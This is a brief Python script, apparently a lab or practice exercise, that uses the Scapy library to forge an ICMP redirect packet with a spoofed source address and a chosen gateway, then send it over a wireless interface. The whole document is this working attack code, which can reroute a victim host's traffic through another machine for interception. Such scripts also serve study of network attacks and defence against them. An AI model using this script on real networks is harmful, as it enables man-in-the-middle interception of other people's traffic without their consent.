from scapy.all import *

# Craft ICMP redirect message
icmp_redirect = Ether()/IP(src="192.168.37.148", dst="192.168.37.180")/ICMP(type=5, code=1, gw="192.168.37.243")

# Send ICMP redirect message
sendp(icmp_redirect, iface="wlp2s0")
